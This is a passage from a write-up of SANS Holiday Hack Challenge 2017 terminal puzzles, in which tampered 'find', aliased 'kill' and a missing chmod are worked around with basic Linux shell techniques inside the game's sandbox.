                         &gt;@&gt;&gt;*&lt;&lt;@&lt;&gt;*&lt;&lt;0&lt;*&lt;
           \*/          &gt;0&gt;&gt;*&lt;&lt;@&lt;&gt;0&gt;&lt;&lt;*&lt;@&lt;&lt;
       ___\\U//___     &gt;*&gt;&gt;@&gt;&lt;0&lt;&lt;*&gt;&gt;@&gt;&lt;*&lt;0&lt;&lt;
       |\\ | | \\|    &gt;@&gt;&gt;0&lt;*&lt;0&gt;&gt;@&lt;&lt;0&lt;&lt;&lt;*&lt;@&lt;&lt;  
       | \\| | _(UU)_ &gt;((*))_&gt;0&gt;&lt;*&lt;0&gt;&lt;@&lt;&lt;&lt;0&lt;*&lt;
       |\ \| || / //||.*.*.*.|&gt;&gt;@&lt;&lt;*&lt;&lt;@&gt;&gt;&lt;0&lt;&lt;&lt;
       |\\_|_|&amp;&amp;_// ||*.*.*.*|_\\db//_               
       """"|'.'.'.|~~|.*.*.*|     ____|_
           |'.'.'.|   ^^^^^^|____|&gt;&gt;&gt;&gt;&gt;&gt;|
           ~~~~~~~~         '""""`------'

My name is Bushy Evergreen, and I have a problem for you.
I think a server got owned, and I can only offer a clue.
We use the system for chat, to keep toy production running.
Can you help us recover from the server connection shunning?


Find and run the elftalkd binary to complete this challenge.
</pre>
</div>
</li>

<li><a id="how-to-find-the-terminal" name="how-to-find-the-terminal"></a><a id="sec-5-1-1-2" name="sec-5-1-1-2"></a>How to find the terminal<br  /><div class="outline-text-5" id="text-how-to-find-the-terminal">

<p>
From this game: <a href="https://2017.holidayhackchallenge.com/game/7e48d6aa-4b73-4027-b23b-a6a1a3460d54">https://2017.holidayhackchallenge.com/game/7e48d6aa-4b73-4027-b23b-a6a1a3460d54</a>
</p>

<p>
Direct Link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=eb5282de-5e43-4813-8ada-5aee3cdb101e&uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=eb5282de-5e43-4813-8ada-5aee3cdb101e&uid=USER_ID</a>
</p>


<div class="figure">
<p><img src="./images/terminal-location-landing.png" alt="terminal-location-landing.png" />
</p>
<p><span class="figure-number">Figure 4:</span> The terminal is right on top of the tower.</p>
</div>
</div>
</li>

<li><a id="background-information" name="background-information"></a><a id="sec-5-1-1-3" name="sec-5-1-1-3"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">

<p>
We are logged in as the user <code>elf</code>. According to Bushy Green's Twitter account someone copied the wrong 'find' executable onto his system.
</p>
</div>
</li>

<li><a id="goal" name="goal"></a><a id="sec-5-1-1-4" name="sec-5-1-1-4"></a>Goal<br  /><div class="outline-text-5" id="text-goal">

<p>
According to the motd we need to find and run the elftalkd binary.
</p>
</div>
</li>

<li><a id="hints" name="hints"></a><a id="sec-5-1-1-5" name="sec-5-1-1-5"></a>Hints<br  /><div class="outline-text-5" id="text-hints">

<p>
<a href="https://twitter.com/GreenestElf">Bushy Evergreen on Twitter has a hint</a>
</p>
<ul class="org-ul">
<li><a href="https://twitter.com/GreenestElf/status/938165130906365952">Ugh, somebody copied over the wrong `find` executable to my system today. How am I supposed to know where find normally is?!</a>
</li>
</ul>
</div>
</li>

<li><a id="approach" name="approach"></a><a id="sec-5-1-1-6" name="sec-5-1-1-6"></a>Approach<br  /><div class="outline-text-5" id="text-approach">

<p>
To solve this challenge we need to find a valid version of <code>find</code> on the system or some other viable version to find the <code>elftalkd</code> binary.
</p>
</div>
</li>

<li><a id="solution" name="solution"></a><a id="sec-5-1-1-7" name="sec-5-1-1-7"></a>Solution<br  /><div class="outline-text-5" id="text-solution">

<p>
First we need to test what's wrong with <code>find</code>.
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ find
bash: /usr/local/bin/find: cannot execute binary file: Exec format error
</pre>
</div>

<p>
It looks like <code>find</code> is located in <code>/usr/local/bin/find</code>. Let's look at our PATH variable that identifies the order that executables are located in.
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ echo $<span style="font-weight: bold; font-style: italic;">PATH</span>
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
</pre>
</div>

<p>
<code>/usr/local/bin</code> is prioritized before <code>/usr/bin</code>. Let's see if find exists in <code>/usr/bin</code>.
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ ls -al /usr/bin/find
-rwxr-xr-x 1 root root 221768 Feb  7  2016 /usr/bin/find
</pre>
</div>

<p>
The original <code>find</code> is still there. We can use it to find the <code>elftalkd</code> binary and execute it.
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ /usr/bin/find / -iname elftalkd            
/usr/bin/find: <span style="font-style: italic;">'/var/cache/ldconfig'</span>: Permission denied
/usr/bin/find: <span style="font-style: italic;">'/var/cache/apt/archives/partial'</span>: Permission denied
/usr/bin/find: <span style="font-style: italic;">'/var/lib/apt/lists/partial'</span>: Permission denied
/run/elftalk/bin/elftalkd
/usr/bin/find: <span style="font-style: italic;">'/proc/tty/driver'</span>: Permission denied
/usr/bin/find: <span style="font-style: italic;">'/root'</span>: Permission denied
elf@784e43534178:~$ /run/elftalk/bin/elftalkd

        Running<span style="font-weight: bold;"> in</span> interactive mode

        --== Initializing elftalkd ==--
Initializing Messaging System!
Nice-O-Meter configured to 0.90 sensitivity.
Acquiring messages from local networks...


--== Initialization Complete ==--

      _  __ _        _ _       _ 
     | |/ _| |      | | |     | |
  ___| | |_| |_ __ _| | | ____| |
 / _ <span style="font-style: italic;">\ </span>|  _| __/ _<span style="font-weight: bold;">` | | |/ / _`</span> |
|  __/ | | | || (_| | |   &lt; (_| |
 <span style="font-style: italic;">\_</span>__|_|_|  <span style="font-style: italic;">\_</span>_<span style="font-style: italic;">\_</span>_,_|_|_|<span style="font-style: italic;">\_\_</span>_,_|

-*&gt; elftalkd! &lt;*-
Version 9000.1 (Build 31337) 
By Santa Claus &amp; The Elf Team
<span style="font-weight: bold;">Copyright</span> (C) 2017 NotActuallyCopyrighted. No actual rights reserved.
Using libc6 version 2.23-0ubuntu9
<span style="font-weight: bold; font-style: italic;">LANG</span>=en_US.UTF-8
<span style="font-weight: bold; font-style: italic;">Timezone</span>=UTC

Commencing Elf Talk Daemon (<span style="font-weight: bold; font-style: italic;">pid</span>=6021)... done!
Background daemon...
</pre>
</div>
</div>
</li>

<li><a id="alternatives" name="alternatives"></a><a id="sec-5-1-1-8" name="sec-5-1-1-8"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">

<p>
The quick method is to iterate through using wildcards to execute the binary.
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ /elftalkd
bash: /elftalkd: No such file or directory
elf@784e43534178:~$ /*/elftalkd
bash: /*/elftalkd: No such file or directory
elf@784e43534178:~$ /*/*/elftalkd
bash: /*/*/elftalkd: No such file or directory
elf@784e43534178:~$ /*/*/*/elftalkd

        Running<span style="font-weight: bold;"> in</span> interactive mode

        --== Initializing elftalkd ==--
Initializing Messaging System!
Nice-O-Meter configured to 0.90 sensitivity.
Acquiring messages from local networks...


--== Initialization Complete ==--

      _  __ _        _ _       _ 
     | |/ _| |      | | |     | |
  ___| | |_| |_ __ _| | | ____| |
 / _ <span style="font-style: italic;">\ </span>|  _| __/ _<span style="font-weight: bold;">` | | |/ / _`</span> |
|  __/ | | | || (_| | |   &lt; (_| |
 <span style="font-style: italic;">\_</span>__|_|_|  <span style="font-style: italic;">\_</span>_<span style="font-style: italic;">\_</span>_,_|_|_|<span style="font-style: italic;">\_\_</span>_,_|

-*&gt; elftalkd! &lt;*-
Version 9000.1 (Build 31337) 
By Santa Claus &amp; The Elf Team
<span style="font-weight: bold;">Copyright</span> (C) 2017 NotActuallyCopyrighted. No actual rights reserved.
Using libc6 version 2.23-0ubuntu9
<span style="font-weight: bold; font-style: italic;">LANG</span>=en_US.UTF-8
<span style="font-weight: bold; font-style: italic;">Timezone</span>=UTC

Commencing Elf Talk Daemon (<span style="font-weight: bold; font-style: italic;">pid</span>=6021)... done!
Background daemon...
</pre>
</div>
</div>
</li></ul>
</div>
</div>
<div id="outline-container-sec-5-2" class="outline-3">
<h3 id="sec-5-2">Winconceivable The Cliffs Of Insanity</h3>
<div class="outline-text-3" id="text-5-2">
</div><div id="outline-container-title" class="outline-4">
<h4 id="title"><a id="sec-5-2-1" name="sec-5-2-1"></a>Winconceivable: The Cliffs of Winsanity</h4>
<div class="outline-text-4" id="text-title">
</div>

<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-5-2-1-1" name="sec-5-2-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">

<pre class="example">
                ___,@
               /  &lt;
          ,_  /    \  _,
      ?    \`/______\`/
   ,_(_).  |; (e  e) ;|
    \___ \ \/\   7  /\/    _\8/_
        \/\   \'=='/      | /| /|
         \ \___)--(_______|//|//|
          \___  ()  _____/|/_|/_|
             /  ()  \    `----'
            /   ()   \
           '-.______.-'
   jgs   _    |_||_|    _
        (@____) || (____@)
         \______||______/


My name is Sparkle Redberry, and I need your help.
My server is atwist, and I fear I may yelp.
Help me kill the troublesome process gone awry.
I will return the favor with a gift before nigh.


Kill the "santaslittlehelperd" process to complete this challenge.
</pre>
</div>
</li>

<li><a id="how-to-find-the-terminal" name="how-to-find-the-terminal"></a><a id="sec-5-2-1-2" name="sec-5-2-1-2"></a>How to find the terminal<br  /><div class="outline-text-5" id="text-how-to-find-the-terminal">

<p>
From this game: <a href="https://2017.holidayhackchallenge.com/game/3e813a9c-cb34-492e-a317-0dd99c8ca2e7">https://2017.holidayhackchallenge.com/game/3e813a9c-cb34-492e-a317-0dd99c8ca2e7</a>
</p>

<p>
Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=82c16868-a96e-4e4c-955e-5b41f7c5809a&uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=82c16868-a96e-4e4c-955e-5b41f7c5809a&uid=USER_ID</a>
</p>


<div class="figure">
<p><img src="./images/terminal-location-cliffs.png" alt="terminal-location-cliffs.png" />
</p>
<p><span class="figure-number">Figure 5:</span> The terminal is on top of the building on the floating island right up front.</p>
</div>
</div>
</li>

<li><a id="background-information" name="background-information"></a><a id="sec-5-2-1-3" name="sec-5-2-1-3"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ <span style="font-weight: bold; font-style: italic;">D</span>=<span style="font-style: italic;">"------"</span>; <span style="font-weight: bold;">echo</span> <span style="font-style: italic;">"$D System info:"</span>; uname -a; cat /etc/issue; <span style="font-weight: bold;">echo</span> <span style="font-style: italic;">"$D Differences from skeleton home directory:"</span>; diff -r /etc/skel .; <span style="font-weight: bold;">echo</span> <span style="font-style: italic;">"$D Who am I?"</span>; id; <span style="font-weight: bold;">echo</span> <span style="font-style: italic;">"$D Running procs:"</span>; ps axf
------ System info:
Linux 784e43534178 4.9.0-4-amd64 <span style="font-weight: bold; font-style: italic;">#</span><span style="font-weight: bold; font-style: italic;">1 SMP Debian 4.9.65-3 (2017-12-03) x86_64 x86_64 x86_64 GNU/Linux</span>
Ubuntu 16.04.3 LTS \n \l
------ Differences from skeleton home directory:
diff -r /etc/skel/.bashrc ./.bashrc
81c81,84
&lt; 
---
&gt;     alias <span style="font-weight: bold; font-style: italic;">kill</span>=<span style="font-style: italic;">'true'</span>
&gt;     alias <span style="font-weight: bold; font-style: italic;">killall</span>=<span style="font-style: italic;">'true'</span>
&gt;     alias <span style="font-weight: bold; font-style: italic;">pkill</span>=<span style="font-style: italic;">'true'</span>
&gt;     alias <span style="font-weight: bold; font-style: italic;">skill</span>=<span style="font-style: italic;">'true'</span>
117a121,122
&gt; <span style="font-weight: bold; font-style: italic;">PATH</span>=$<span style="font-weight: bold; font-style: italic;">PATH</span>:/usr/games
&gt; cat /etc/motd
------ Who am I?
<span style="font-weight: bold; font-style: italic;">uid</span>=1000(elf) <span style="font-weight: bold; font-style: italic;">gid</span>=1000(elf) <span style="font-weight: bold; font-style: italic;">groups</span>=1000(elf)
------ Running procs:
  PID TTY      STAT   TIME COMMAND
    1 pts/0    Ss     0:00 /bin/bash /sbin/init
    8 pts/0    S      0:00 /usr/bin/santaslittlehelperd
   11 pts/0    S      0:00 /sbin/kworker
   18 pts/0    S      0:01  <span style="font-style: italic;">\_</span> /sbin/kworker
   12 pts/0    S      0:00 /bin/bash
  994 pts/0    R+     0:00  <span style="font-style: italic;">\_</span> ps axf
</pre>
</div>

<p>
We see that <code>/usr/bin/santaslittlehelperd</code> is running, and we're told
that we need to kill it. However, we see that in our <code>.bashrc</code> file,
<code>kill</code> and its variants are aliased to <code>true</code>, which has no effect.
</p>
</div>
</li>

<li><a id="goal" name="goal"></a><a id="sec-5-2-1-4" name="sec-5-2-1-4"></a>Goal<br  /><div class="outline-text-5" id="text-goal">

<p>
We need to <code>kill santaslittlehelperd</code>, but our <code>kill</code> has been turned ineffective.
</p>
</div>
</li>

<li><a id="hints" name="hints"></a><a id="sec-5-2-1-5" name="sec-5-2-1-5"></a>Hints<br  /><div class="outline-text-5" id="text-hints">

<p>
<a href="https://twitter.com/GlitteryElf">Sparkle Redberry on Twitter has some hints</a>
</p>
<ul class="org-ul">
<li><a href="https://twitter.com/GlitteryElf/status/938539753372237824">https://twitter.com/GlitteryElf/status/938539753372237824</a> Dear #lazyweb: How do I fix a malicious alias on my Linux box? It seems to be stopping me from killing processes&#x2026;
</li>
<li><a href="https://twitter.com/GlitteryElf/status/938540163726061568">https://twitter.com/GlitteryElf/status/938540163726061568</a> I tried `man alias`, but that doesn't even exist. It looks like maybe it's a built-in to bash itself?
</li>
<li><a href="https://twitter.com/GlitteryElf/status/938540426088214528">https://twitter.com/GlitteryElf/status/938540426088214528</a> Update: I read into `man bash`, and I even found a section on ALIASES (starting with "Aliases allow a string to be substituted for a word when it is used as the first word of a simple command[&#x2026;]" but I couldn't even make it 40 words in before I got all cross-eyed.
</li>
</ul>
</div>
</li>

<li><a id="approach" name="approach"></a><a id="sec-5-2-1-6" name="sec-5-2-1-6"></a>Approach<br  /><div class="outline-text-5" id="text-approach">

<p>
From the <a href="http://tldp.org/LDP/abs/html/aliases.html">Bash documentation</a>:
</p>

<blockquote>
<p>
A Bash alias is essentially nothing more than a keyboard shortcut, an abbreviation, a means of avoiding typing a long command sequence.
</p>
</blockquote>

<p>
Here, however, aliases have been used to effectively disable <code>kill</code>
and its brethren. We need to figure out a way to run the real version
of <code>kill</code> instead of the aliased version. One way to do this is to use the <code>which</code> command:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ which kill
/bin/kill
</pre>
</div>

<p>
Using the full path to the binary will bypass the alias, and allow us to actually run <code>kill</code>.
</p>

<pre class="example">
elf@784e43534178:~$ /bin/kill -h
Usage:
 kill [options] &lt;pid&gt; [...]
Options:
 &lt;pid&gt; [...]            send signal to every &lt;pid&gt; listed
 -&lt;signal&gt;, -s, --signal &lt;signal&gt;
                        specify the &lt;signal&gt; to be sent
 -l, --list=[&lt;signal&gt;]  list all signal names, or convert one to a name
 -L, --table            list all signal names in a nice table
 -h, --help     display this help and exit
 -V, --version  output version information and exit
For more details see kill(1).
</pre>

<p>
All that's left is to determine the process ID (<code>pid</code>) of the process to be killed. We can use the <code>ps</code> command to determine this:
</p>

<pre class="example">
elf@784e43534178:~$ ps axf
  PID TTY      STAT   TIME COMMAND
    1 pts/0    Ss     0:00 /bin/bash /sbin/init
    8 pts/0    S      0:00 /usr/bin/santaslittlehelperd
   11 pts/0    S      0:00 /sbin/kworker
   18 pts/0    S      0:01  \_ /sbin/kworker
   12 pts/0    S      0:00 /bin/bash
  649 pts/0    R+     0:00  \_ ps axf
elf@784e43534178:~$ /bin/kill 8
elf@784e43534178:~$ ps axf
  PID TTY      STAT   TIME COMMAND
    1 pts/0    Ss     0:00 /bin/bash /sbin/init
   12 pts/0    S      0:00 /bin/bash
  658 pts/0    R+     0:00  \_ ps axf
</pre>

<p>
Santa's little helper is no more.
</p>
</div>
</li>

<li><a id="solution" name="solution"></a><a id="sec-5-2-1-7" name="sec-5-2-1-7"></a>Solution<br  /><div class="outline-text-5" id="text-solution">

<p>
A one-liner is: <code>/usr/bin/pkill -f santaslittlehelperd</code>. <code>pkill</code> can
kill a process by name, and the <code>-f</code> argument will have it match
against the full name of the process.
</p>

<p>
AsciiCinema video of the solution?
</p>
</div>
</li>

<li><a id="alternatives" name="alternatives"></a><a id="sec-5-2-1-8" name="sec-5-2-1-8"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">

<p>
Another approach is simply to remove the alias, by using the unalias command:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ unalias kill
elf@784e43534178:~$ ps axf
  PID TTY      STAT   TIME COMMAND
    1 pts/0    Ss     0:00 /bin/bash /sbin/init
    8 pts/0    S      0:00 /usr/bin/santaslittlehelperd
   11 pts/0    S      0:00 /sbin/kworker
   18 pts/0    S      0:00  <span style="font-style: italic;">\_</span> /sbin/kworker
   12 pts/0    S      0:00 /bin/bash
   31 pts/0    R+     0:00  <span style="font-style: italic;">\_</span> ps axf
elf@784e43534178:~$ kill 8
elf@784e43534178:~$ ps axf
  PID TTY      STAT   TIME COMMAND
    1 pts/0    Ss     0:00 /bin/bash /sbin/init
   12 pts/0    S      0:00 /bin/bash
   36 pts/0    R+     0:00  <span style="font-style: italic;">\_</span> ps axf
</pre>
</div>

<p>
Alternatively, you could run <code>bash</code> with the <code>--norc</code> flag, which
prevents it from reading and executing the <code>~/.bashrc</code> file where the
aliases are added.
</p>

<p>
One more approach is to call the command you want with a backslash.
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ \kill 8
elf@784e43534178:~$ ps axf
  PID TTY      STAT   TIME COMMAND
    1 pts/0    Ss     0:00 /bin/bash /sbin/init
   12 pts/0    S      0:00 /bin/bash
   36 pts/0    R+     0:00  <span style="font-style: italic;">\_</span> ps axf
</pre>
</div>

<p>
Or call the command in quotes.
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ <span style="font-style: italic;">"kill"</span> 8
elf@784e43534178:~$ ps axf
  PID TTY      STAT   TIME COMMAND
    1 pts/0    Ss     0:00 /bin/bash /sbin/init
   12 pts/0    S      0:00 /bin/bash
   36 pts/0    R+     0:00  <span style="font-style: italic;">\_</span> ps axf
</pre>
</div>
</div>
</li>

<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-2-1-9" name="sec-5-2-1-9"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">

<p>
The fact that <code>kill</code> was aliased to <code>true</code> was problematic, because
<code>true</code> never returns any output. Thus, it would look like the <code>kill</code>
command worked, but the process would still be running. Running
something like <code>kill -h</code> would reveal that <code>kill</code> was not being run
correctly, since the help output would not be displayed.
</p>
</div>
</li></ul>
</div>
</div>
<div id="outline-container-sec-5-3" class="outline-3">
<h3 id="sec-5-3">Cryokinetic Magic</h3>
<div class="outline-text-3" id="text-5-3">
</div><div id="outline-container-title" class="outline-4">
<h4 id="title"><a id="sec-5-3-1" name="sec-5-3-1"></a>Cryokinetic Magic</h4>
<div class="outline-text-4" id="text-title">
</div>

<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-5-3-1-1" name="sec-5-3-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">

<pre class="example">
                     ___
                    / __'.     .-"""-.
              .-""-| |  '.'.  / .---. \
             / .--. \ \___\ \/ /____| |
            / /    \ `-.-;-(`_)_____.-'._
           ; ;      `.-" "-:_,(o:==..`-. '.         .-"-,
           | |      /       \ /      `\ `. \       / .-. \
           \ \     |         Y    __...\  \ \     / /   \/
     /\     | |    | .--""--.| .-'      \  '.`---' /
     \ \   / /     |`        \'   _...--.;   '---'`
      \ '-' / jgs  /_..---.._ \ .'\\_     `.
       `--'`      .'    (_)  `'/   (_)     /
                  `._       _.'|         .'
                     ```````    '-...--'`

My name is Holly Evergreen, and I have a conundrum.
I broke the candy cane striper, and I'm near throwing a tantrum.
Assembly lines have stopped since the elves can't get their candy cane fix.
We hope you can start the striper once again, with your vast bag of tricks.


Run the CandyCaneStriper executable to complete this challenge.
</pre>
</div>
</li>

<li><a id="how-to-find-the-terminal" name="how-to-find-the-terminal"></a><a id="sec-5-3-1-2" name="sec-5-3-1-2"></a>How to find the terminal<br  /><div class="outline-text-5" id="text-how-to-find-the-terminal">

<p>
From this game: <a href="https://2017.holidayhackchallenge.com/game/a1f7ac49-8210-436b-9e25-0c19f9ebfe02">https://2017.holidayhackchallenge.com/game/a1f7ac49-8210-436b-9e25-0c19f9ebfe02</a>
</p>

<p>
Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=da6d34d1-012b-420b-a7d5-369914353578&uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=da6d34d1-012b-420b-a7d5-369914353578&uid=USER_ID</a>
</p>


<div class="figure">
<p><img src="./images/terminal-location-cryokinetic.png" alt="terminal-location-cryokinetic.png" />
</p>
<p><span class="figure-number">Figure 6:</span> The terminal is on top of the ice shanty.</p>
</div>
</div>
</li>

<li><a id="background-information" name="background-information"></a><a id="sec-5-3-1-3" name="sec-5-3-1-3"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">
</div>
</li>

<li><a id="goal" name="goal"></a><a id="sec-5-3-1-4" name="sec-5-3-1-4"></a>Goal<br  /><div class="outline-text-5" id="text-goal">

<p>
We need to run the <code>CandyCaneStriper</code> program. Upon initial inspection we discover that <code>/usr/bin/chmod</code> is empty and <code>CandyCaneStriper</code> has no execution flags set.
</p>
</div>
</li>

<li><a id="hints" name="hints"></a><a id="sec-5-3-1-5" name="sec-5-3-1-5"></a>Hints<br  /><div class="outline-text-5" id="text-hints">

<p>
<a href="https://twitter.com/GreenesterElf">Holly Evergreen on Twitter has a hint</a>
</p>
<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">Update: LD_PRELOAD is awesome, but it doesn&#39;t help in this situation. <a href="https://t.co/gkF690pdAJ">https://t.co/gkF690pdAJ</a> looks like the right approach, but it&#39;s not working on this system for some reason. Ugh, I step away from this for a bit and check with others. I&#39;m too frustrated.</p>&mdash; Holly Evergreen (@GreenesterElf) <a href="https://twitter.com/GreenesterElf/status/938544194070634496?ref_src=twsrc%5Etfw">December 6, 2017</a></blockquote>

<p>
Following the link describes a familiar situation:
</p>
</div>
</li>


<li><a id="approach" name="approach"></a><a id="sec-5-3-1-6" name="sec-5-3-1-6"></a>Approach<br  /><div class="outline-text-5" id="text-approach">

<p>
Let's take a look at the executable we're dealing with:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@f76931683b1e:~$ ls -l CandyCaneStriper 
-rw-r--r-- 1 root root 45224 Dec 15 19:59 CandyCaneStriper
elf@f76931683b1e:~$ file CandyCaneStriper 
CandyCaneStriper: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, <span style="font-weight: bold; font-style: italic;">BuildID</span>[sha1]=bfe4ffd88f30e6970feb7e3341ddbe579e9ab4b3, stripped
</pre>
</div>

<p>
Much like how Python and Perl scripts have interpreters, ELF binaries also have interpreters. For our target, <code>file</code> tells us that our interpreter is <code>/lib64/ld-linux-x86-64.so.2</code>.
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@d5823d933b5d:~$ /lib64/ld-linux-x86-64.so.2
Usage: ld.so [OPTION]... EXECUTABLE-FILE [ARGS-FOR-PROGRAM...]
You have invoked <span style="font-weight: bold;">`ld.so', the helper program for shared library executables.</span>
<span style="font-weight: bold;">This program usually lives in the file `</span>/lib/ld.so<span style="font-style: italic;">', and special directives</span>
<span style="font-style: italic;">in executable files using ELF shared libraries tell the system'</span>s program
loader to load the helper program from this file.  This helper program loads
the shared libraries needed by the program executable, prepares the program
to run, and runs it.  You may invoke this helper program directly from the
<span style="font-weight: bold;">command</span> line to load and run an ELF executable file; this is like executing
that file itself, but always uses this helper program from the file you
specified, instead of the helper program file specified<span style="font-weight: bold;"> in</span> the executable
file you run.  This is mostly of use for maintainers to test new versions
of this helper program; chances are you did not intend to run this program.
  --list                list all dependencies and how they are resolved
  --verify              verify that given object really is a dynamically linked
                        object we can handle
  --inhibit-cache       Do not use /etc/ld.so.cache
  --library-path PATH   use given PATH instead of content of the environment
                        variable LD_LIBRARY_PATH
  --inhibit-rpath LIST  ignore RUNPATH and RPATH information<span style="font-weight: bold;"> in</span> object names
                        <span style="font-weight: bold;">in</span> LIST
  --audit LIST          use objects named<span style="font-weight: bold;"> in</span> LIST as auditors

elf@d5823d933b5d:~$ /lib64/ld-linux-x86-64.so.2 ./CandyCaneStriper
</pre>
</div>
</div>
</li>

<li><a id="solution" name="solution"></a><a id="sec-5-3-1-7" name="sec-5-3-1-7"></a>Solution<br  /><div class="outline-text-5" id="text-solution">

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ /lib64/ld-linux-x86-64.so.2 ./CandyCaneStriper
                   _..._
                 <span style="font-weight: bold;">.</span><span style="font-style: italic;">'\\ //`,      </span>
<span style="font-style: italic;">                /\\.'</span><span style="font-weight: bold;">``</span><span style="font-style: italic;">'.=",</span>
<span style="font-style: italic;">               / \/     ;==|</span>
<span style="font-style: italic;">              /\\/    .'\`</span>,<span style="font-weight: bold;">`</span>
<span style="font-weight: bold;">             / \/     `</span><span style="font-style: italic;">""</span><span style="font-weight: bold;">`</span>
<span style="font-weight: bold;">            /\\/</span>
<span style="font-weight: bold;">           /\\/</span>
<span style="font-weight: bold;">          /\ /</span>
<span style="font-weight: bold;">         /\\/</span>
<span style="font-weight: bold;">        /`</span><span style="font-style: italic;">\/</span>
        <span style="font-style: italic;">\\</span>/
         <span style="font-weight: bold;">`</span>
<span style="font-weight: bold;">The candy cane striping machine is up and running!</span>
</pre>
</div>
</div>
</li>

<li><a id="alternatives" name="alternatives"></a><a id="sec-5-3-1-8" name="sec-5-3-1-8"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">

<p>
Overwrite an executable file with the existing binary:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@2798541ad158:~$ ls -l /bin/chmod
-rwxr-xr-x 1 root root 0 Dec 15 20:00 /bin/chmod
elf@2798541ad158:~$ cp /bin/ls new
elf@2798541ad158:~$ cat CandyCaneStriper  &gt; new
elf@2798541ad158:~$ ls -l
total 96
-rw-r--r-- 1 root root 45224 Dec 15 19:59 CandyCaneStriper
-rwxr-xr-x 1 elf  elf  45224 Dec 17 00:15 new
elf@2798541ad158:~$ ./new
</pre>
</div>

<p>
Use python to chmod.  The chmod binary is just a wrapper around the
chmod libc function.  Any programming language will have this
available:
</p>

<div class="org-src-container">

<pre class="src src-sh">&gt;&gt;&gt; import os
&gt;&gt;&gt; os.chmod(<span style="font-style: italic;">"CandyCaneStriper"</span>, 0755)
<span style="font-weight: bold;">Traceback</span> (most recent call last):
  File <span style="font-style: italic;">"&lt;stdin&gt;"</span>, line 1,<span style="font-weight: bold;"> in</span> &lt;module&gt;
OSError: [Errno 1] Operation not permitted: <span style="font-style: italic;">'CandyCaneStriper'</span>
</pre>
</div>

<p>
FAIL :(  What if make a copy first?
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@d5823d933b5d:~$ cp CandyCaneStriper c
elf@d5823d933b5d:~$ python
Python 2.7.12 (default, Nov 20 2017, 18:23:56) 
[GCC 5.4.0 20160609] on linux2
Type <span style="font-style: italic;">"help"</span>, <span style="font-style: italic;">"copyright"</span>, <span style="font-style: italic;">"credits"</span> or <span style="font-style: italic;">"license"</span> for more information.
&gt;&gt;&gt; import os
&gt;&gt;&gt; os.chmod(<span style="font-style: italic;">"c"</span>, 0755)
&gt;&gt;&gt; ^d
elf@d5823d933b5d:~$ ./c
</pre>
</div>

<p>
With perl:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@1e6fe4ce3449:~$ cp CandyCaneStriper c
elf@1e6fe4ce3449:~$ cat &gt; fix.pl
chmod 0755 <span style="font-style: italic;">"c"</span>;
^d
elf@1e6fe4ce3449:~$ perl fix.pl 
String found where operator expected at fix.pl line 1, near <span style="font-style: italic;">"0755 "</span>c<span style="font-style: italic;">""</span>
        (Missing operator before  <span style="font-style: italic;">"c"</span>?)
syntax error at fix.pl line 1, near <span style="font-style: italic;">"0755 "</span>c<span style="font-style: italic;">""</span>
Execution of fix.pl aborted due to compilation errors.
elf@1e6fe4ce3449:~$ cat &gt; fix.pl
chmod 0755, <span style="font-style: italic;">"c"</span>;
^d
elf@1e6fe4ce3449:~$ perl fix.pl 
elf@1e6fe4ce3449:~$ ./c
</pre>
</div>

<p>
Or as a perl one liner, now that we figured out the syntax:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@1e6fe4ce3449:~$ cp CandyCaneStriper c
elf@1e6fe4ce3449:~$ perl -e <span style="font-style: italic;">'chmod 0755, "c"'</span>
</pre>
</div>
</div>
</li></ul>
</div>
</div>
<div id="outline-container-sec-5-4" class="outline-3">
<h3 id="sec-5-4">There's No Place Like Home</h3>
<div class="outline-text-3" id="text-5-4">
</div><div id="outline-container-title" class="outline-4">
<h4 id="title"><a id="sec-5-4-1" name="sec-5-4-1"></a>There's Snow Place Like Home</h4>
<div class="outline-text-4" id="text-title">
</div>

<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-5-4-1-1" name="sec-5-4-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">

<pre class="example">
                             ______
                          .-"""".._'.       _,##
                   _..__ |.-"""-.|  |   _,##'`-._
                  (_____)||_____||  |_,##'`-._,##'`
                  _|   |.;-""-.  |  |#'`-._,##'`
